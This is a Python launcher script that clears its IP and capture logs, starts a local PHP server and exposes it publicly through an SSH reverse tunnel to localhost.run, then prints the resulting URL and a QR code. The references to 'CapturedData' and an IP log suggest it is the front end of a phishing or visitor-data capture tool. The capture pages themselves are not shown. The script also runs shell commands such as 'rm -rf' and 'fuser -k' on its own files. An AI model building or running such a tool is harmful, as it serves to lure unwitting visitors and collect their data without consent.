from time import sleep
from os import system, chdir, getcwd
from subprocess import Popen
from Server import *
from re import findall
from socket import socket, AF_INET, SOCK_STREAM

def freshStart():
    """ 
        cleaning up and resetting certain files and processes
    """
    # Remove ip.log file in Server directory
    system('rm -rf Server/ip.log')
    
    # Remove and recreate Log.log file in Server directory
    system('rm -rf Server/Log.log && touch Server/Log.log')
    
    # Remove and recreate path.txt file in Server directory
    system('rm -rf Server/path.txt && touch Server/path.txt')
    
   # Kill processes using link.url file, remove and recreate link.url file
    system('fuser -k link.url > /dev/null 2>&1 && rm -rf link.url && touch link.url')

    
def getpath():
    """
        Retrieves the current working directory path and writes it to path.txt files
        within Server/ directory for further use.
    """
    # Retrieve the current working directory path
    currentDirectory = getcwd()

    # Write the path followed by "/CapturedData/" to a path.txt file within the Server/ directory
    with open("Server/path.txt", "w") as f:
        f.write(f"{currentDirectory}/CapturedData/")


def selectPort():
    """
        Allows the user to select a port within the range of 1 to 65535.
    """

    def portIsAvailable(port):
        with socket(AF_INET, SOCK_STREAM) as s:
            try:
                s.bind(('localhost', port))
            except OSError:
                s.close()
                return False  # Port is in use
            else:
                s.close()
                return True  # Port is not in use

    system('clear') # clear screen

    print("\n --------------------------------------\n Select Any Available Port [1-65535]:\n --------------------------------------")

    userChoice = int(input("   <Port> ----> "))

    try:

        if 1 <= userChoice <= 65535:
                
            if portIsAvailable(userChoice):
                return userChoice
            
            print(f"\n Error: Port {userChoice} is already in use. Please choose another port.")
        
        else:            
            print("\n Error: Port number must be between 1 and 65535")
            
    except:
        print("\n Error: Please enter a valid integer")

    sec = 1

    print(f"\n  Refreshig in {sec}s ", end="")

    for _ in range(sec):
        print(".", end="", flush=True)
        sleep(1)

    return selectPort()


def startServer(port):
    
    def shutDown():
        print("\n\n - Shutting down...")

        # Terminate ngrok process
        localhostrun_process.terminate()
        
        # Terminate PHP server process
        php_server.terminate()

        # Wait for the processes to exit
        localhostrun_process.wait()
        php_server.wait()

        print(" - Server shut down.")

    print("\n-----------------------\n CREATING A CUSTOM URL \n-----------------------\n")
    print(f"- Requesting tunnel on port {port}...\n")

    # Change the current directory to 'Server'
    chdir("Server")
    
    php_server = Popen(f"php -S 127.0.0.1:{port} > /dev/null 2>&1 &", shell=True)

    # Start ngrok to tunnel traffic to the local server on the specified port
    localhostrun_process = Popen(f"ssh -R 80:localhost:{port} nokey@localhost.run > link.url 2>/dev/null", shell=True)

    sleep(3.5)

    try:

        with open("link.url", "r") as f:
            text = f.read()

            url = findall(r'https?://?(\S+\.lhr\.life)', text)[0]

            print(f"URL link: https://{url}\n\n\r SCAN QR Code:")

            system("tail -n +5 link.url | cat")
            sleep(10000)
            
    except KeyboardInterrupt as e:
        print("An error occured in StartServer", e)
    finally:
        shutDown()
    

def main():
    
    # freshStart() ; 

    getpath() ; system('clear') 
    
    port = selectPort() ; system('clear') 

    startServer(port) ; 

    system("reset")

    print(" - FINISHED...")


if __name__ == "__main__":
    main()
